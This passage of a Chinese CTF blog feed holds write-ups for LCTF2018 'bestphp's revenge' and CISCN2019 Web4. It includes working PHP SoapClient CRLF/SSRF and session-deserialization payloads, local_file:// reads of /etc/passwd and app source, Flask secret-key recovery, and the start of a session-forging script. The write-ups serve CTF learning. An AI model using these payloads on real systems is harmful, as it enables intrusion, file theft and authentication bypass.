class="hljs-string">&quot;demo&quot;</span><br>);<br><span class="hljs-variable">$attack</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-variable">$options</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$attack</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>)-&gt;<span class="hljs-title function_ invoke__">ff</span>(); <span class="hljs-comment">// 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ruby">→/home nc - lvp <span class="hljs-number">2333</span><br>listening on [any] <span class="hljs-number">2333</span><br>connect to [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>] from localhost [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>] <span class="hljs-number">42022</span><br><span class="hljs-variable constant_">POST</span> / <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: localhost <span class="hljs-symbol">:</span><span class="hljs-number">2333</span><br><span class="hljs-title class_">Connection</span>: <span class="hljs-title class_">Keep</span>-<span class="hljs-title class_">Alive</span><br><span class="hljs-title class_">User</span> -<span class="hljs-title class_">Agent</span>: mochazz<br><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable constant_">PHPSESSID</span>= <span class="hljs-number">123123</span>    <br><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: text/xml; charset=utf-<span class="hljs-number">8</span><br><span class="hljs-title class_">SOAPAction</span>: <span class="hljs-string">&quot;demo#a&quot;</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Length</span>: <span class="hljs-number">365</span><br><br>&lt;<span class="hljs-string">?x</span>ml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-string">?&gt;</span> <br>&lt;<span class="hljs-variable constant_">S0AP</span>- <span class="hljs-variable constant_">ENV</span><span class="hljs-symbol">:Envelope</span> <span class="hljs-symbol">xmlns:</span> <span class="hljs-variable constant_">S0AP</span>- <span class="hljs-variable constant_">ENV</span>= <span class="hljs-string">&quot;http:/ /schemas . xmlsoap . org/ soap/envelope/&quot;</span> <span class="hljs-symbol">xmlns:</span>ns1=<span class="hljs-string">&quot;demo&quot;</span> xmIns <span class="hljs-symbol">:xsd=<span class="hljs-string">&quot;http:/ /www .w3.org/</span></span><br><span class="hljs-string"><span class="hljs-symbol">2001/XMLSchema&quot;</span></span> xmIns : <span class="hljs-variable constant_">SOAP</span> -<span class="hljs-variable constant_">ENC</span>=<span class="hljs-string">&quot;http://schemas .xmlsoap .or g/soap/ encoding/&quot;</span> <span class="hljs-variable constant_">SOAP</span>- <span class="hljs-variable constant_">ENV</span><span class="hljs-symbol">:encodingStyle=<span class="hljs-string">&quot;http://schemas .xmlsoap.og/ soap/ encoding/&quot;</span>&gt;&lt;S0AP</span> - <span class="hljs-variable constant_">ENV</span> : <span class="hljs-title class_">Body</span>&gt;&lt;ns1 <span class="hljs-symbol">:a/&gt;&lt;/S0AP</span> - <span class="hljs-variable constant_">ENV</span>: <span class="hljs-title class_">Body</span>&gt;&lt;<span class="hljs-regexp">/S0AP ENV: Envelope&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="三-call-user-func"><a href="#三-call-user-func" class="headerlink" title="三. call_user_func"></a>三. call_user_func</h2><p><strong>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</strong></p><p>先传入extract()，将$b覆盖成回调函数，这样题目中的 <strong>call_user_func($b,$a)</strong> 就可以变成 <strong>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</strong> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p><hr><h2 id="四-PHPsession-反序列化"><a href="#四-PHPsession-反序列化" class="headerlink" title="四. PHPsession 反序列化"></a>四. PHPsession 反序列化</h2><table><thead><tr><th>Directive</th><th>含义</th></tr></thead><tbody><tr><td>session.save_handler</td><td>session保存形式。默认为files</td></tr><tr><td>session.save_path</td><td>session保存路径。</td></tr><tr><td>session.serialize_handler</td><td>session序列化存储所用处理器。默认为php。</td></tr><tr><td>session.upload_progress.cleanup</td><td>一旦读取了所有POST数据，立即清除进度信息。默认开启</td></tr><tr><td>session.upload_progress.enabled</td><td>将上传文件的进度信息存在session中。默认开启。</td></tr></tbody></table><p>我们先通过一个样例代码，看看3种不同的 <strong>session</strong> 序列化处理器处理 <strong>session</strong> 的情况。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;mochazz&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当 <strong>session.serialize_handler&#x3D;php</strong> 时，session文件内容为： <code>name|s:7:&quot;mochazz&quot;;</code></p><p>当 <strong>session.serialize_handler&#x3D;php_serialize</strong> 时，session文件为： <code>a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;mochazz&quot;;&#125;</code></p><p>当 <strong>session.serialize_handler&#x3D;php_binary</strong> 时，session文件内容为： <code>二进制字符names:7:&quot;mochazz&quot;;</code></p><p><strong>而当session反序列化和序列化时候使用不同引擎的时候，即可触发漏洞</strong></p><p><strong>php引擎会以|作为作为key和value的分隔符，我们在传入内容的时候，比如传入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$_SESSION</span>[‘name’] = ‘|username‘<br></code></pre></td></tr></table></figure><p><strong>那么使用php_serialize引擎时可以得到序列化内容</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:”name”;s:<span class="hljs-number">4</span>:”|username”;&#125;<br></code></pre></td></tr></table></figure><p><strong>然后用php引擎反序列化时，|被当做分隔符，于是</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:”name”;s:<span class="hljs-number">4</span>:”<br></code></pre></td></tr></table></figure><p><strong>被当作key</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">username<br></code></pre></td></tr></table></figure><p><strong>被当做vaule进行反序列化</strong></p><p><strong>于是，我们只要传入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$_SESSION</span>[‘name’] = |序列化内容<br></code></pre></td></tr></table></figure><p><strong>即可触发漏洞</strong></p><p>知识点结束。</p><h1 id="解题分析"><a href="#解题分析" class="headerlink" title="解题分析"></a>解题分析</h1><p>分析一下题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);  <span class="hljs-comment">//参数二的位置固定为 $_POST 数组，我们很容易便想到利用 extract 函数进行变量覆盖，以便配合后续利用</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;   <span class="hljs-comment">//存在 session 伪造漏洞，我们可以考虑是否可以包含 session 文件或者利用 session 反序列化漏洞</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>) &#123; &#125;<br><br><br><span class="hljs-comment">//flag.php  (扫目录扫到的)</span><br>only localhost can get flag!<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>       <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-variable">$flag</span>;<br>   &#125;<br>only localhost can get flag!<br></code></pre></td></tr></table></figure><p>分析一下代码，flag.php文件告诉我们，只有127.0.0.1请求该页面才能得到flag，所以明显是考察SSRF漏洞，这里我们可以利用SoapClient类的__call方法来进行SSRF</p><p>第一步：由于PHP中的原生 SoapClient类存在CRLF漏洞，所以我们可以伪造任意header，构造SoapClient类，并用php_serialize引擎进行序列化，存入session</p><p><strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）</strong></p><p>我们可以利用回调函数，通过给f传参，值为session_start，然后post提交   <code>array(&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;)</code></p><p>即达到<strong>session_start(array(‘serialize_handler’ &#x3D;&gt; ‘php_serialize’))</strong> ，将会根据php7特性设置session.serialize_handler&#x3D;php_serialize。而又因为session是可控的，可以通过传入name值，任意伪造。这里就想到name传入的是序列化值了，序列化exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span>=<span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<br>    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;npfs\r\nCookie:PHPSESSID=123456\r\n&quot;</span>,<br>    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>));<br><br><span class="hljs-variable">$se</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$se</span>);<br><br><span class="hljs-comment">//注意下，这个脚本想要执行，需要将php.ini里的 php_soap.dll 前面的分号去掉</span><br></code></pre></td></tr></table></figure><p>执行脚本得到</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">|O<span class="hljs-variable">%3</span>A<span class="hljs-number">10</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>SoapClient<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>uri<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">17</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>http<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>location<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">25</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>http<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-variable">%2</span>Fflag.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>_user_agent<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">31</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>npfs<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>ACookie<span class="hljs-variable">%3</span>APHPSESSID<span class="hljs-variable">%3</span>D<span class="hljs-number">123456</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>_soap_version<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p><img src="/../image/bestphp's-revenge-4.png"></p><p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法</p><p>传值f&#x3D;extract&amp;name&#x3D;SoapClient      POST:b&#x3D;call_user_func. 这样  call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap  请求进行 SSRF 。</p><p><img src="/../image/bestphp's-revenge-5.png"></p><p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p><p><img src="/../image/bestphp's-revenge-6.png"></p><p>总的流程如下，图来源于网络<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%BA%8C">PHP反序列化入门之session反序列化</a></p><p><img src="/../image/bestphp's-revenge-7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoapClient类进行SSRF </tag>
            
            <tag> CRLF </tag>
            
            <tag> call_user_func </tag>
            
            <tag> session反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019华东南赛区-Web4</title>
      <link href="/2025/05/05/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/"/>
      <url>/2025/05/05/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2019华东南赛区-Web4"><a href="#CISCN2019华东南赛区-Web4" class="headerlink" title="CISCN2019华东南赛区-Web4"></a>CISCN2019华东南赛区-Web4</h1><p>参考博客：<a href="https://blog.csdn.net/mochu7777777/article/details/107656285">https://blog.csdn.net/mochu7777777/article/details/107656285</a></p><p>首先打开页面</p><p><img src="/../image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4-1.png"></p><p>点击Read somethings，发现没反应，查看网页源码<br><img src="/../image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4-2.png"></p><p>发现这里是这样跳转的。我们尝试随便访问一下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/read?<span class="hljs-attribute">url</span>=www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="/../image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4-3.png"></p><p>这种路由处理方式并不像是PHP，尝试了<code>file:///etc/passwd</code>没有效果，猜测<code>Flask</code>，尝试<code>local_file:///</code>读取文件</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">/<span class="hljs-keyword">read</span>?url=local_file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/pass</span>wd<br></code></pre></td></tr></table></figure><p><img src="/../image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4-4.png"></p><p>读取成功。</p><p>尝试读取源码</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">/<span class="hljs-keyword">read</span>?url=local_file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/app/app</span>.py<br></code></pre></td></tr></table></figure><p><img src="/../image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4-5.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re, random, uuid, urllib<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No Hack&#x27;</span><br>        res = urllib.urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">True</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br></code></pre></td></tr></table></figure><p><code>session[&#39;username&#39;] == &#39;fuck&#39;</code>可得到flag，接下来就是要伪造<code>session</code>，而伪造<code>session</code>或者解密<code>session</code>都需要<code>密钥</code>，在源码中有密钥的生成方式：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">random<span class="hljs-selector-class">.seed</span>(uuid<span class="hljs-selector-class">.getnode</span>())<br>app<span class="hljs-selector-class">.config</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>]</span> = <span class="hljs-built_in">str</span>(random<span class="hljs-selector-class">.random</span>()*<span class="hljs-number">233</span>)<br></code></pre></td></tr></table></figure><p>对于伪随机数，如果seed是固定的，生成的随机数是可以预测的，也就是顺序固定的，所以只要知道seed的值即可。这里的seed使用的uuid.getnode()的值，该函数用于获取Mac地址并将其转换为整数。</p><p>那么就需要读取Mac地址local_file:&#x2F;&#x2F;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address<br>得到Mac地址：ae:02:dd:61:cb:b9<br>然后使用Python2得出密钥（Python2和Python3保留的位数不一样）</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> random</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.seed(<span class="hljs-number">0xae02dd61cbb9</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>))</span><br>187.265372344<br></code></pre></td></tr></table></figure><p>我这里用的kali的python2。</p><p><img src="/../image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4-6.png"></p><p>然后利用Flask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br>__author__ = <span class="hljs-string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><br><span class="hljs-comment"># standard imports</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span 